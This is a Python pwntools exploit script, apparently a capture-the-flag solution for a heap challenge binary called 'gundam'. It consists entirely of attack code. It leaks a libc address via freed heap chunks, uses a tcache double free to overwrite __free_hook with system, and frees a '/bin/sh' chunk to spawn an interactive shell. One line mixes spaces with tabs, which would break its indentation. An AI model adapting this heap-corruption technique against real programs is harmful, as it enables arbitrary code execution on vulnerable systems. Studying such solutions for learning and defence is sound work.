from pwn import *
context.log_level = "debug"

def build(name):
	io.sendlineafter(' :', "1")
	io.sendafter(' :', name)
	io.sendlineafter(' :', "1")

def visit():
	io.sendlineafter(' :', "2")

def destroy(idx):
	io.sendlineafter(' :', "3")
        io.sendlineafter(":", str(idx))

def blow():
	io.sendlineafter(' :', "4")

io = process("./gundam")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

for i in xrange(9):
	build('m4x') 

for i in xrange(9):
	destroy(i)
blow()
for i in xrange(8):
	build('a' * 8)

build('a'*8)
visit()

io.recvuntil('Gundam[7] :aaaaaaaa')

libc.address = u64(io.recv(6).ljust(8,'\0')) - 88 - 0x10 - libc.symbols['__malloc_hook']
print '[*] system:',hex(libc.symbols['system'])
for i in range(0,8):
	destroy(i)
blow()
build('m4x') #0
build('/bin/sh\0') #0 1
build('m4x') #0
destroy(0)
destroy(0)
build(p64(libc.symbols['__free_hook'] - 0x10))# 0 1 2
build('a' * 0x30)
build(p64(libc.symbols['system']) * 3)
destroy(1)

io.interactive()
